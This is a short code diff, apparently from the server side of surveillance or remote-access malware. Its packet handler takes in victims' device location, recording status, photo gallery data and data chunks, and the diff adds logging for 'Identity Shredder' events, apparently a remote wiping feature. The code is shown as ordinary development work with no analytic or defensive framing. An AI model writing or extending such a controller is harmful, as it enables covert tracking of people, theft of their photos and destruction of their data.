@@ -96,6 +96,8 @@ def handle_tcp_data(raw_line, cid):
                 loc = packet.get('data', {}) if isinstance(packet.get('data'), dict) else {"url": packet.get('url')}
                 cd['location'].update({"url": loc.get('url'), "img": loc.get('image_url'), "status": "success"})
             elif t == 'RECORD_STATUS': cd['media']['status'] = packet.get('status')
+            elif t == 'SHRED_COMPLETE': add_log(f"CRITICAL: Identity Shredder completed on {cid}")
+            elif t == 'SHRED_PENDING': add_log(f"ALERT: Identity Shredder initiated on {cid}")
             elif t == 'GALLERY_PAGE_DATA': cd['gallery'].update(packet.get('data', packet))
             elif 'CHUNK' in t:
                 chunk = packet.get('chunk_data', {})
